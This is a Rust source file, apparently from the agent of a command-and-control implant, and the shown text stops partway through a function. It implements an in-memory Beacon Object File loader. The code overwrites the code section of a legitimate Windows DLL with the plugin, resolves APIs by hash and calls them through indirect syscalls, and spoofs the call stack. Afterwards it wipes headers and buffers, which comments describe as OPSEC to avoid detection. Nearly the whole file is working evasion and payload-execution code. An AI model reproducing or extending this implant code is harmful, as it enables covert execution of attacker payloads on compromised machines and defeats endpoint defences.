// Client/core/src/loader/bof.rs
 // BOF (Beacon Object File) Engine
// 负责解析、重定位并在内存中执行 COFF 格式插件。
// 支持 x86 和 x64 架构

use super::plugin_api as beacon_api;
use super::error::{BofError, BofResult};
use super::safety;
use log::{debug, info, warn};
use std::collections::hash_map::DefaultHasher;
use std::collections::HashMap;
use std::hash::BuildHasherDefault;
use std::sync::Mutex;

/// Explicit SipHash hasher — `DefaultHasher::new()` is const, no `RandomState`
/// thread_local. Mandatory under pe_map TLS neutralization (any std HashMap
/// with the default hasher AVs at gs:[0x58]+0x7FFFFFFF*8 in a mapped module).
pub(crate) type NoTlsHasher = BuildHasherDefault<DefaultHasher>;

// 符号缓存 - 避免重复解析相同符号
lazy_static::lazy_static! {
    static ref SYMBOL_CACHE: Mutex<HashMap<String, usize, NoTlsHasher>> =
        Mutex::new(HashMap::with_hasher(NoTlsHasher::default()));
}

// --- COFF 常量定义 ---
const IMAGE_FILE_MACHINE_I386: u16 = 0x014c; // x86 (32-bit)
const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664; // x64 (64-bit)

// x64 重定位类型
const IMAGE_REL_AMD64_ADDR64: u16 = 1; // 64位绝对地址
const IMAGE_REL_AMD64_ADDR32: u16 = 2; // 32位绝对地址
const IMAGE_REL_AMD64_ADDR32NB: u16 = 3; // 32位相对于镜像基址
const IMAGE_REL_AMD64_REL32: u16 = 4; // 32位相对地址
const IMAGE_REL_AMD64_REL32_1: u16 = 5;
const IMAGE_REL_AMD64_REL32_2: u16 = 6;
const IMAGE_REL_AMD64_REL32_3: u16 = 7;
const IMAGE_REL_AMD64_REL32_4: u16 = 8;
const IMAGE_REL_AMD64_REL32_5: u16 = 9;

/// Per-execution IAT: `__imp_*` relocs need the **address of a pointer slot**,
/// not the function VA (code is typically `call qword ptr [rip+rel]`).
///
/// Slots must live within signed-32-bit reach of the mapped BOF code —
/// REL32 displacements wrap past ±2GB and dereference wild addresses. The
/// table therefore prefers a VirtualAlloc'd page near the image and only
/// falls back to the heap when no nearby region can be reserved.
struct IatTable {
    /// First slot pointer — never reallocated during execution.
    slots_ptr: *mut usize,
    slots_cap: usize,
    /// Heap backing (fallback path).
    heap: Option<Box<[usize; 512]>>,
    /// Proximity page backing (VirtualAlloc), freed in Drop.
    near_page: Option<*mut u8>,
    count: usize,
    /// symbol name → slot index
    index: HashMap<String, usize, NoTlsHasher>,
}

impl IatTable {
    fn new() -> Self {
        Self::new_near(0)
    }

    /// Allocate slot storage; when `code_addr` is given, try to reserve it
    /// within REL32 reach of that address first.
    fn new_near(code_addr: usize) -> Self {
        if code_addr != 0 {
            if let Some(page) = unsafe { va_alloc_near(code_addr, 0x1000) } {
                return Self {
                    slots_ptr: page as *mut usize,
                    slots_cap: 512,
                    heap: None,
                    near_page: Some(page),
                    count: 0,
                    index: HashMap::with_hasher(NoTlsHasher::default()),
                };
            }
            warn!("[!] IAT proximity alloc failed — heap slots may be out of REL32 reach");
        }
        let mut heap = Box::new([0usize; 512]);
        let ptr = heap.as_mut_ptr();
        Self {
            slots_ptr: ptr,
            slots_cap: 512,
            heap: Some(heap),
            near_page: None,
            count: 0,
            index: HashMap::with_hasher(NoTlsHasher::default()),
        }
    }

    /// Return address of the IAT slot that holds `fn_addr`.
    fn slot_for(&mut self, name: &str, fn_addr: usize) -> usize {
        if let Some(&idx) = self.index.get(name) {
            return unsafe {
                *self.slots_ptr.add(idx) = fn_addr;
                self.slots_ptr.add(idx) as usize
            };
        }
        if self.count >= self.slots_cap {
            warn!("[!] IAT table full, cannot resolve {}", name);
            return 0;
        }
        let idx = self.count;
        self.count += 1;
        self.index.insert(name.to_string(), idx);
        unsafe {
            *self.slots_ptr.add(idx) = fn_addr;
            self.slots_ptr.add(idx) as usize
        }
    }
}

impl Drop for IatTable {
    fn drop(&mut self) {
        if let Some(page) = self.near_page.take() {
            unsafe { va_free_page(page) };
        }
    }
}

/// Reserve `size` bytes within ±~1.75GB of `code_addr` (REL32-safe window).
/// Probes 2MB-aligned candidates outward in both directions; VirtualAlloc with
/// a non-NULL hint returns NULL instead of relocating, so each probe is exact.
#[cfg(windows)]
unsafe fn va_alloc_near(code_addr: usize, size: usize) -> Option<*mut u8> {
    let k32 = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
    if k32 == 0 {
        return None;
    }
    let va_addr = crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"VirtualAlloc"))?;
    let vf_addr = crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"VirtualFree"))?;
    type VaFn = unsafe extern "system" fn(*mut u8, usize, u32, u32) -> *mut u8;
    type VfFn = unsafe extern "system" fn(*mut u8, usize, u32) -> i32;
    let va: VaFn = std::mem::transmute(va_addr);
    let vf: VfFn = std::mem::transmute(vf_addr);
    const MEM_COMMIT: u32 = 0x1000;
    const MEM_RESERVE: u32 = 0x2000;
    const PAGE_READWRITE: u32 = 0x04;
    const MEM_RELEASE: u32 = 0x8000;

    let near_enough = |a: usize| {
        let d = if a >= code_addr { a - code_addr } else { code_addr - a };
        d < 0x7000_0000
    };

    for i in 1..=896usize {
        let off = i * 0x20_0000; // 2MB steps → covers ±0x70000000 window
        // Below the image first (module/DLL region tends to extend downward)
        if code_addr > off + 0x10_0000 {
            let cand = (code_addr - off) & !0xFFFFusize;
            let p = va(cand as *mut u8, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if !p.is_null() {
                if near_enough(p as usize) {
                    return Some(p);
                }
                let _ = vf(p, 0, MEM_RELEASE);
            }
        }
        if let Some(up) = code_addr.checked_add(off) {
            if up < 0x7FFF_0000_0000usize {
                let cand = up & !0xFFFFusize;
                let p = va(cand as *mut u8, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if !p.is_null() {
                    if near_enough(p as usize) {
                        return Some(p);
                    }
                    let _ = vf(p, 0, MEM_RELEASE);
                }
            }
        }
    }
    None
}

#[cfg(not(windows))]
unsafe fn va_alloc_near(_code_addr: usize, _size: usize) -> Option<*mut u8> {
    None
}

#[cfg(windows)]
unsafe fn va_free_page(page: *mut u8) {
    if page.is_null() {
        return;
    }
    let k32 = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
    if k32 == 0 {
        return;
    }
    if let Some(addr) = crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"VirtualFree"))
    {
        type VfFn = unsafe extern "system" fn(*mut u8, usize, u32) -> i32;
        let vf: VfFn = std::mem::transmute(addr);
        let _ = vf(page, 0, 0x8000);
    }
}

#[cfg(not(windows))]
unsafe fn va_free_page(_page: *mut u8) {}

// x86 重定位类型
#[allow(dead_code)]
const IMAGE_REL_I386_DIR32: u16 = 6; // 32位绝对地址
#[allow(dead_code)]
const IMAGE_REL_I386_DIR32NB: u16 = 7; // 32位相对于镜像基址
#[allow(dead_code)]
const IMAGE_REL_I386_REL32: u16 = 20; // 32位相对地址

// --- COFF 结构体定义 ---
#[repr(C, packed)]
#[derive(Copy, Clone)]
pub(super) struct CoffFileHeader {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[repr(C, packed)]
#[derive(Copy, Clone)]
pub(super) struct CoffSectionHeader {
    name: [u8; 8],
    misc: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    pointer_to_relocations: u32,
    pointer_to_linenumbers: u32,
    number_of_relocations: u16,
    number_of_linenumbers: u16,
    characteristics: u32,
}

#[repr(C, packed)]
#[derive(Copy, Clone)]
pub(super) struct CoffRelocation {
    virtual_address: u32,
    symbol_table_index: u32,
    typ: u16,
}

#[repr(C, packed)]
#[derive(Copy, Clone)]
pub(super) struct CoffSymbol {
    name: [u8; 8],
    value: u32,
    section_number: i16,
    typ: u16,
    storage_class: u8,
    num_aux: u8,
}

pub struct BofLoader;

/// E2E breadcrumb — env-gated via `AGENT_TRACE_FILE` (product default: no-op).
fn tracef(msg: &str) {
    crate::tracef_g(msg);
}

impl BofLoader {
    /// 清除符号缓存
    /// 在需要重新加载 DLL 或更新系统状态时调用
    pub fn clear_symbol_cache() {
        if let Ok(mut cache) = SYMBOL_CACHE.lock() {
            cache.clear();
            debug!("[*] Symbol cache cleared");
        }
    }

    /// 获取符号缓存统计信息
    pub fn get_cache_stats() -> (usize, usize) {
        if let Ok(cache) = SYMBOL_CACHE.lock() {
            let total = cache.len();
            let resolved = cache.values().filter(|&&v| v != 0).count();
            (total, resolved)
        } else {
            (0, 0)
        }
    }

    /// 加载并运行一个 BOF 插件
    ///
    /// OPSEC / stability:
    /// - COFF bytes never touch disk (caller memory only; burn after return)
    /// - Map + reloc + `go()` run on a dedicated OS thread under a scoped VEH so
    ///   hard faults (AV etc.) terminate only that worker — agent process survives
    pub async fn execute(coff_data: &[u8], args: &[u8]) -> BofResult<String> {
        info!("[*] coff plugin load ({} bytes)", coff_data.len());

        // Reset output
        beacon_api::clear_bof_output();
        tracef("execute: output cleared");

        // 验证 COFF 文件头
        super::safety::validate_coff_header(coff_data)?;
        tracef("execute: header ok");

        // 安全地读取文件头
        let header = unsafe { super::safety::read_packed_struct::<CoffFileHeader>(coff_data, 0)? };

        // 验证段表
        super::safety::validate_section_table(
            coff_data,
            std::mem::size_of::<CoffFileHeader>(),
            header.number_of_sections,
        )?;

        // 验证符号表
        if header.pointer_to_symbol_table > 0 && header.number_of_symbols > 0 {
            super::safety::validate_symbol_table(
                coff_data,
                header.pointer_to_symbol_table,
                header.number_of_symbols,
            )?;
        }

        // High-risk path: stack spoof + full-job VEH isolation (map/reloc/go).
        let machine = header.machine;
        tracef(&format!("execute: validated, machine=0x{:X}", machine));

        #[cfg(windows)]
        {
            // Own the buffers on the isolated worker so the agent control-plane
            // thread never runs untrusted COFF map/reloc code.
            let mut coff_owned = coff_data.to_vec();
            let mut args_owned = args.to_vec();
            let header_copy = header;
            let r = bof_seh::run_isolated_job(move || {
                let out = match machine {
                    IMAGE_FILE_MACHINE_AMD64 => {
                        info!("[*] payload arch: x64");
                        crate::stealth::stack::with_spoofed_stack(|| {
                            Self::execute_x64_sync(&coff_owned, &args_owned, &header_copy)
                        })
                    }
                    IMAGE_FILE_MACHINE_I386 => {
                        info!("[*] payload arch: x86");
                        crate::stealth::stack::with_spoofed_stack(|| {
                            Self::execute_x86_sync(&coff_owned, &args_owned, &header_copy)
                        })
                    }
                    _ => Err(BofError::UnsupportedArchitecture(machine)),
                };
                // Burn worker copies before the isolated thread exits.
                for b in coff_owned.iter_mut() {
                    *b = 0;
                }
                for b in args_owned.iter_mut() {
                    *b = 0;
                }
                out.map_err(|e| e.to_string())
            });
            tracef("execute: isolated job returned");
            match r {
                Ok(s) => Ok(s),
                Err(e) => {
                    // Prefer structured ExecutionFailed; keep partial Beacon output if any.
                    let partial = beacon_api::get_bof_output();
                    if !partial.is_empty() && e.contains("fault") {
                        Ok(format!("{partial}\n[bof] {e}"))
                    } else if e.starts_with("Unsupported architecture") {
                        Err(BofError::UnsupportedArchitecture(machine))
                    } else {
                        Err(BofError::ExecutionFailed(e))
                    }
                }
            }
        }
        #[cfg(not(windows))]
        {
            match machine {
                IMAGE_FILE_MACHINE_AMD64 => {
                    info!("[*] payload arch: x64");
                    Self::execute_x64_sync(coff_data, args, &header)
                }
                IMAGE_FILE_MACHINE_I386 => {
                    info!("[*] payload arch: x86");
                    Self::execute_x86_sync(coff_data, args, &header)
                }
                _ => Err(BofError::UnsupportedArchitecture(machine)),
            }
        }
    }

    /// 执行 x64 BOF（同步；由 execute 外包 stack spoof）
    fn execute_x64_sync(
        coff_data: &[u8],
        args: &[u8],
        header: &CoffFileHeader,
    ) -> BofResult<String> {
        unsafe {
            tracef("x64_sync: entry");
            // 1. True Module Overloading: rotate carrier DLLs (avoid single known xpsprint fingerprint)
            let base_addr = Self::map_rotated_carrier(false)?;
            tracef(&format!("x64_sync: carrier mapped 0x{:X}", base_addr));

            debug!("[+] image mapped at: 0x{:X}", base_addr);

            // 2. 定位载体 DLL 的 .text 段
            use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};

            // 验证 DOS 头
            if base_addr == 0 {
                return Err(BofError::MemoryAllocationFailed(
                    "Invalid base address".to_string(),
                ));
            }

            let dos_header = base_addr as *const IMAGE_DOS_HEADER;
            let e_lfanew = (*dos_header).e_lfanew;

            // 验证 NT 头偏移
            if e_lfanew < 0 || e_lfanew as usize > 0x1000 {
                return Err(BofError::InvalidCoffFormat(
                    "Invalid PE header offset".to_string(),
                ));
            }

            let nt_headers = (base_addr + e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
            let section_count = (*nt_headers).FileHeader.NumberOfSections;

            // 验证段数量
            if section_count == 0 || section_count > 96 {
                return Err(BofError::InvalidCoffFormat(format!(
                    "Invalid section count: {}",
                    section_count
                )));
            }

            let section_headers = (nt_headers as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>())
                as *const IMAGE_SECTION_HEADER;

            let mut carrier_text_addr = 0;
            let mut carrier_text_size = 0;
            for i in 0..section_count {
                let sec = &*section_headers.add(i as usize);
                if sec.Name.starts_with(b".text") {
                    carrier_text_addr = base_addr + sec.VirtualAddress as usize;
                    carrier_text_size = *sec.Misc.VirtualSize() as usize;

                    // 验证段大小
                    if carrier_text_size == 0 || carrier_text_size > 0x10000000 {
                        return Err(BofError::InvalidCoffFormat(format!(
                            "Invalid .text section size: 0x{:X}",
                            carrier_text_size
                        )));
                    }
                    break;
                }
            }

            if carrier_text_addr == 0 {
                return Err(BofError::SectionNotFound(".text".to_string()));
            }
            tracef(&format!(
                "x64_sync: text 0x{:X} size 0x{:X}",
                carrier_text_addr, carrier_text_size
            ));

            // 3. 将载体 .text 修改为 RW
            let mut old_protect = 0;
            let hash_nt_protect = crate::stealth::hash_api_name(b"NtProtectVirtualMemory");
            let mut region_size = carrier_text_size;
            let mut protect_addr = carrier_text_addr;
            tracef("x64_sync: calling NtProtectVirtualMemory");
            let st_rw = crate::syscalls::indirect_syscall(
                hash_nt_protect,
                &[
                    0xFFFFFFFFFFFFFFFFu64 as usize,
                    &mut protect_addr as *mut _ as usize,
                    &mut region_size as *mut _ as usize,
                    0x04, // PAGE_READWRITE
                    &mut old_protect as *mut _ as usize,
                ],
            );
            tracef(&format!(
                "x64_sync: protect returned 0x{:X}",
                st_rw as u32
            ));
            crate::db_print!(
                "[bof] RW protect status=0x{:X} (addr=0x{:X} size=0x{:X})",
                st_rw as u32, protect_addr, region_size
            );

            // 4. Parse BOF sections — section table is after optional header
            let section_header_offset =
                std::mem::size_of::<CoffFileHeader>() + header.size_of_optional_header as usize;

            safety::validate_section_table(
                coff_data,
                section_header_offset,
                header.number_of_sections,
            )?;

            let bof_sections =
                (coff_data.as_ptr() as usize + section_header_offset) as *const CoffSectionHeader;

            safety::validate_symbol_table(
                coff_data,
                header.pointer_to_symbol_table,
                header.number_of_symbols,
            )?;

            let symbols = std::slice::from_raw_parts(
                (coff_data.as_ptr() as usize + header.pointer_to_symbol_table as usize)
                    as *const CoffSymbol,
                header.number_of_symbols as usize,
            );
            let string_table = (coff_data.as_ptr() as usize
                + header.pointer_to_symbol_table as usize
                + (header.number_of_symbols * 18) as usize)
                as *const u8;

            // Phase 1: map all sections (including BSS / zero-raw)
            let mut current_offset: usize = 0;
            let mut section_map =
                std::collections::HashMap::with_hasher(NoTlsHasher::default());
            let mut pending_relocs: Vec<(usize, u32, u16)> = Vec::new(); // (dest_base, reloc_ptr, count)

            for i in 0..header.number_of_sections {
                let sec = &*bof_sections.add(i as usize);
                let raw_data_size = sec.size_of_raw_data as usize;
                // VirtualSize lives in misc for COFF/PE section headers
                let virtual_size = sec.misc as usize;
                let alloc_size = virtual_size.max(raw_data_size);
                if alloc_size == 0 {
                    continue;
                }

                if current_offset.checked_add(alloc_size).ok_or_else(|| {
                    BofError::InvalidCoffFormat("Section offset overflow".to_string())
                })? > carrier_text_size
                {
                    return Err(BofError::InvalidCoffFormat(format!(
                        "payload sections exceed host .text size (0x{:X} > 0x{:X})",
                        current_offset + alloc_size,
                        carrier_text_size
                    )));
                }

                let dest = (carrier_text_addr + current_offset) as *mut u8;
                // Zero full virtual span (BSS + padding)
                std::ptr::write_bytes(dest, 0, alloc_size);

                if raw_data_size > 0 {
                    let raw_data_offset = sec.pointer_to_raw_data as usize;
                    if raw_data_offset.checked_add(raw_data_size).ok_or_else(|| {
                        BofError::BoundsCheckFailed {
                            offset: raw_data_offset,
                            size: coff_data.len(),
                        }
                    })? > coff_data.len()
                    {
                        return Err(BofError::BoundsCheckFailed {
                            offset: raw_data_offset + raw_data_size,
                            size: coff_data.len(),
                        });
                    }
                    let src = coff_data.as_ptr().add(raw_data_offset);
                    safety::safe_copy_memory(
                        dest,
                        src,
                        raw_data_size,
                        carrier_text_addr,
                        carrier_text_size,
                    )?;
                }

                section_map.insert(i + 1, dest as usize); // 1-indexed

                if sec.number_of_relocations > 0 {
                    safety::validate_relocation_table(
                        coff_data,
                        sec.pointer_to_relocations,
                        sec.number_of_relocations,
                    )?;
                    pending_relocs.push((
                        dest as usize,
                        sec.pointer_to_relocations,
                        sec.number_of_relocations,
                    ));
                }

                current_offset += alloc_size;
            }

            // Phase 2: apply all relocations with full section_map + IAT
            let mut iat = IatTable::new_near(carrier_text_addr);
            crate::db_print!(
                "[bof] carrier=0x{:X} .text=0x{:X}+0x{:X} iat_slots=0x{:X} ({})",
                base_addr,
                carrier_text_addr,
                carrier_text_size,
                iat.slots_ptr as usize,
                if iat.near_page.is_some() { "near" } else { "HEAP-FALLBACK" }
            );
            for (dest_base, reloc_off, reloc_count) in pending_relocs {
                let relocs = std::slice::from_raw_parts(
                    (coff_data.as_ptr() as usize + reloc_off as usize) as *const CoffRelocation,
                    reloc_count as usize,
                );
                Self::patch_symbols(
                    dest_base as *mut u8,
                    relocs,
                    symbols,
                    string_table,
                    &section_map,
                    &mut iat,
                );
            }

            // 5. Entry: go / _go (skip AUX records)
            let mut entry_point_addr = 0usize;
            let mut si = 0usize;
            while si < symbols.len() {
                let sym = &symbols[si];
                let name = Self::get_symbol_name(sym, string_table);
                if name == "go" || name == "_go" {
                    let base = *section_map.get(&(sym.section_number as u16)).unwrap_or(&0);
                    if base != 0 {
                        entry_point_addr = base + sym.value as usize;
                        break;
                    }
                }
                si += 1 + sym.num_aux as usize;
            }

            if entry_point_addr == 0 {
                Self::release_carrier_mapping(base_addr);
                return Err(BofError::EntryPointNotFound("go".to_string()));
            }

            // 6. Stage RW → execute for go(). Classic BOF packs .text+.data+.bss into
            // one carrier span; pure PAGE_EXECUTE_READ faults on the first global write
            // (dir.x64 hangs/crashes after "calling go"). Use EXECUTE_READWRITE for the
            // used span only for the duration of go(); wipe/unmap after.
            // Ideal W^X needs per-section page split (follow-up).
            const PAGE_EXECUTE_READ: u32 = 0x20;
            const PAGE_EXECUTE_READWRITE: u32 = 0x40;
            let mut st_rx = crate::syscalls::indirect_syscall(
                hash_nt_protect,
                &[
                    0xFFFFFFFFFFFFFFFFu64 as usize,
                    &mut protect_addr as *mut _ as usize,
                    &mut region_size as *mut _ as usize,
                    PAGE_EXECUTE_READWRITE as usize,
                    &mut old_protect as *mut _ as usize,
                ],
            );
            if (st_rx as i32) < 0 {
                // Fallback pure RX (code-only BOFs)
                protect_addr = carrier_text_addr;
                region_size = carrier_text_size;
                st_rx = crate::syscalls::indirect_syscall(
                    hash_nt_protect,
                    &[
                        0xFFFFFFFFFFFFFFFFu64 as usize,
                        &mut protect_addr as *mut _ as usize,
                        &mut region_size as *mut _ as usize,
                        PAGE_EXECUTE_READ as usize,
                        &mut old_protect as *mut _ as usize,
                    ],
                );
            }
            crate::db_print!(
                "[bof] RX protect status=0x{:X} entry=0x{:X} — calling go",
                st_rx as u32, entry_point_addr
            );

            // Run go() on a dedicated thread under a scoped VEH. Unhandled AV inside
            // a BOF (e.g. dir.x64 wcsncat(NULL) on empty args) used to APPCRASH the
            // whole agent (fault module msvcrt.dll, c0000005). The VEH exits only
            // the BOF thread so the agent process survives and returns an error.
            let go_status = unsafe {
                invoke_bof_go_guarded(entry_point_addr, args.as_ptr(), args.len() as i32)
            };
            crate::db_print!("[bof] go() returned status={:?}", go_status);

            // Keep IAT slots alive until after go() returns
            let _ = iat;

            let out = beacon_api::get_bof_output();
            crate::db_print!("[bof] output captured: {} bytes", out.len());
            Self::release_carrier_mapping(base_addr);
            crate::db_print!("[bof] carrier released, returning");
            match go_status {
                Ok(()) => Ok(out),
                Err(e) => {
                    if out.is_empty() {
                        Err(BofError::ExecutionFailed(e))
                    } else {
                        // Partial output before the fault — surface both.
                        Ok(format!("{out}\n[bof] {e}"))
                    }
                }
            }
        }
    }

    /// Best-effort: wipe and unmap carrier view after BOF execution.
    unsafe fn release_carrier_mapping(base_addr: usize) {
        if base_addr == 0 {
            return;
        }
        // Zero first page headers to reduce PE signature residue. The SEC_IMAGE
        // view maps the header page read-only, so it must be flipped RW first —
        // otherwise the wipe itself faults.
        let mut wipe_addr = base_addr;
        let mut wipe_size: usize = 0x1000;
        let mut old_protect = 0u32;
        let st = crate::syscalls::indirect_syscall(
            crate::stealth::hash_api_name(b"NtProtectVirtualMemory"),
            &[
                0xFFFFFFFFFFFFFFFFu64 as usize,
                &mut wipe_addr as *mut _ as usize,
                &mut wipe_size as *mut _ as usize,
                0x04, // PAGE_READWRITE
                &mut old_protect as *mut _ as usize,
            ],
        );
        if st >= 0 {
            let wipe = std::slice::from_raw_parts_mut(base_addr as *mut u8, 0x1000.min(4096));
            for b in wipe.iter_mut() {
                *b = 0;
            }
        }
        let mut base = base_addr;
        let mut size: usize = 0;
        let _ = crate::syscalls::indirect_syscall(
            crate::stealth::hash_api_name(b"NtUnmapViewOfSection"),
            &[
                0xFFFFFFFFFFFFFFFFu64 as usize, // NtCurrentProcess
                base,
            ],
        );
        // Fallback: free if unmap unavailable
        let _ = crate::syscalls::indirect_syscall(
            crate::stealth::hash_api_name(b"NtFreeVirtualMemory"),
            &[
                0xFFFFFFFFFFFFFFFFu64 as usize,
                &mut base as *mut _ as usize,
                &mut size as *mut _ as usize,
                0x8000, // MEM_RELEASE
            ],
        );
        let _ = size;
    }

    /// 执行 x86 BOF (32位)
    fn execute_x86_sync(
        _coff_data: &[u8],
        _args: &[u8],
        _header: &CoffFileHeader,
    ) -> BofResult<String> {
        #[cfg(target_arch = "x86_64")]
        {
            return Err(BofError::architecture_mismatch("x86", "x64"));
        }

        #[cfg(target_arch = "x86")]
        unsafe {
            let coff_data = _coff_data;
            let args = _args;
            let header = _header;
            // 1. Module Overloading: rotate carrier DLLs (WOW64 path)
            let base_addr = Self::map_rotated_carrier(true)?;

            debug!("[+] image mapped at: 0x{:X}", base_addr);

            // 2. 定位载体 DLL 的 .text 段
            use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS32, IMAGE_SECTION_HEADER};
            let dos_header = base_addr as *const IMAGE_DOS_HEADER;
            let nt_headers =
                (base_addr + (*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS32;
            let section_headers = (nt_headers as usize + std::mem::size_of::<IMAGE_NT_HEADERS32>())
                as *const IMAGE_SECTION_HEADER;

            let mut carrier_text_addr = 0;
            let mut carrier_text_size = 0;
            for i in 0..(*nt_headers).FileHeader.NumberOfSections {
                let sec = &*section_headers.add(i as usize);
                if sec.Name.starts_with(b".text") {
                    carrier_text_addr = base_addr + sec.VirtualAddress as usize;
                    carrier_text_size = *sec.Misc.VirtualSize() as usize;
                    break;
                }
            }

            if carrier_text_addr == 0 {
                return Err(BofError::SectionNotFound(".text".to_string()));
            }

            // 3. 将载体 .text 修改为 RW
            let mut old_protect = 0;
            let hash_nt_protect = crate::stealth::hash_api_name(b"NtProtectVirtualMemory");
            let mut region_size = carrier_text_size;
            let mut protect_addr = carrier_text_addr;
            crate::syscalls::indirect_syscall(
                hash_nt_protect,
                &[
                    0xFFFFFFFFu32 as usize, // NtCurrentProcess for x86
                    &mut protect_addr as *mut _ as usize,
                    &mut region_size as *mut _ as usize,
                    0x04, // PAGE_READWRITE
                    &mut old_protect as *mut _ as usize,
                ],
            );

            // 4. Section table after optional header; two-phase map + x86 reloc
            let section_header_offset =
                std::mem::size_of::<CoffFileHeader>() + header.size_of_optional_header as usize;

            safety::validate_section_table(
                coff_data,
                section_header_offset,
                header.number_of_sections,
            )?;

            let bof_sections =
                (coff_data.as_ptr() as usize + section_header_offset) as *const CoffSectionHeader;

            safety::validate_symbol_table(
                coff_data,
                header.pointer_to_symbol_table,
                header.number_of_symbols,
            )?;

            let symbols = std::slice::from_raw_parts(
                (coff_data.as_ptr() as usize + header.pointer_to_symbol_table as usize)
                    as *const CoffSymbol,
                header.number_of_symbols as usize,
            );
            let string_table = (coff_data.as_ptr() as usize
                + header.pointer_to_symbol_table as usize
                + (header.number_of_symbols * 18) as usize)
                as *const u8;

            let mut current_offset: usize = 0;
            let mut section_map =
                std::collections::HashMap::with_hasher(NoTlsHasher::default());
            let mut pending_relocs: Vec<(usize, u32, u16)> = Vec::new();

            for i in 0..header.number_of_sections {
                let sec = &*bof_sections.add(i as usize);
                let raw_data_size = sec.size_of_raw_data as usize;
                let virtual_size = sec.misc as usize;
                let alloc_size = virtual_size.max(raw_data_size);
                if alloc_size == 0 {
                    continue;
                }

                if current_offset.checked_add(alloc_size).ok_or_else(|| {
                    BofError::InvalidCoffFormat("Section offset overflow".to_string())
                })? > carrier_text_size
                {
                    return Err(BofError::InvalidCoffFormat(format!(
                        "payload sections exceed host .text size (0x{:X} > 0x{:X})",
                        current_offset + alloc_size,
                        carrier_text_size
                    )));
                }

                let dest = (carrier_text_addr + current_offset) as *mut u8;
                std::ptr::write_bytes(dest, 0, alloc_size);

                if raw_data_size > 0 {
                    let raw_data_offset = sec.pointer_to_raw_data as usize;
                    if raw_data_offset.checked_add(raw_data_size).ok_or_else(|| {
                        BofError::BoundsCheckFailed {
                            offset: raw_data_offset,
                            size: coff_data.len(),
                        }
                    })? > coff_data.len()
                    {
                        return Err(BofError::BoundsCheckFailed {
                            offset: raw_data_offset + raw_data_size,
                            size: coff_data.len(),
                        });
                    }
                    let src = coff_data.as_ptr().add(raw_data_offset);
                    safety::safe_copy_memory(
                        dest,
                        src,
                        raw_data_size,
                        carrier_text_addr,
                        carrier_text_size,
                    )?;
                }

                section_map.insert(i + 1, dest as usize);

                if sec.number_of_relocations > 0 {
                    safety::validate_relocation_table(
                        coff_data,
                        sec.pointer_to_relocations,
                        sec.number_of_relocations,
                    )?;
                    pending_relocs.push((
                        dest as usize,
                        sec.pointer_to_relocations,
                        sec.number_of_relocations,
                    ));
                }

                current_offset += alloc_size;
            }

            let mut iat = IatTable::new_near(carrier_text_addr);
            for (dest_base, reloc_off, reloc_count) in pending_relocs {
                let relocs = std::slice::from_raw_parts(
                    (coff_data.as_ptr() as usize + reloc_off as usize) as *const CoffRelocation,
                    reloc_count as usize,
                );
                Self::patch_symbols_x86(
                    dest_base as *mut u8,
                    relocs,
                    symbols,
                    string_table,
                    &section_map,
                    &mut iat,
                );
            }

            let mut entry_point_addr = 0usize;
            let mut si = 0usize;
            while si < symbols.len() {
                let sym = &symbols[si];
                let name = Self::get_symbol_name(sym, string_table);
                if name == "go" || name == "_go" {
                    let base = *section_map.get(&(sym.section_number as u16)).unwrap_or(&0);
                    if base != 0 {
                        entry_point_addr = base + sym.value as usize;
                        break;
                    }
                }
                si += 1 + sym.num_aux as usize;
            }

            if entry_point_addr == 0 {
                return Err(BofError::EntryPointNotFound("go".to_string()));
            }

            // Same as x64: co-located .data needs write during go(); pure RX faults.
            crate::syscalls::indirect_syscall(
                hash_nt_protect,
                &[
                    0xFFFFFFFFu32 as usize,
                    &mut protect_addr as *mut _ as usize,
                    &mut region_size as *mut _ as usize,
                    0x40, // PAGE_EXECUTE_READWRITE
                    &mut old_protect as *mut _ as usize,
                ],
            );

            let go: extern "cdecl" fn(*const u8, i32) = std::mem::transmute(entry_point_addr);
            go(args.as_ptr(), args.len() as i32);
            let _ = iat;

            Ok(beacon_api::get_bof_output())
        }
    }

    /// True Module Overloading: 利用 SEC_IMAGE 映射合法 DLL
    unsafe fn module_overload_map(path: &str) -> BofResult<usize> {
        use winapi::shared::ntdef::{
            InitializeObjectAttributes, HANDLE, NULL, OBJECT_ATTRIBUTES, UNICODE_STRING,
        };
        use winapi::um::winnt::{
            FILE_GENERIC_READ, PAGE_READONLY, SECTION_MAP_EXECUTE, SECTION_MAP_READ, SEC_IMAGE,
        };

        // 1. 将路径转换为 UNICODE_STRING
        let mut path_u16: Vec<u16> = path.encode_utf16().collect();
        path_u16.push(0);
        let mut us_path = UNICODE_STRING {
            Length: ((path_u16.len() - 1) * 2) as u16,
            MaximumLength: (path_u16.len() * 2) as u16,
            Buffer: path_u16.as_mut_ptr(),
        };

        let mut obj_attr: OBJECT_ATTRIBUTES = std::mem::zeroed();
        InitializeObjectAttributes(&mut obj_attr, &mut us_path, 0x40, NULL, NULL);

        // 2. NtOpenFile
        let mut h_file: HANDLE = NULL;
        let mut io_status: [usize; 2] = [0, 0];
        let hash_nt_open_file = crate::stealth::hash_api_name(b"NtOpenFile");
        tracef("overload: NtOpenFile begin");
        let status = crate::syscalls::indirect_syscall(
            hash_nt_open_file,
            &[
                &mut h_file as *mut _ as usize,
                FILE_GENERIC_READ as usize,
                &mut obj_attr as *mut _ as usize,
                &mut io_status as *mut _ as usize,
                1,    // FILE_SHARE_READ
                0x20, // FILE_NON_DIRECTORY_FILE
            ],
        );
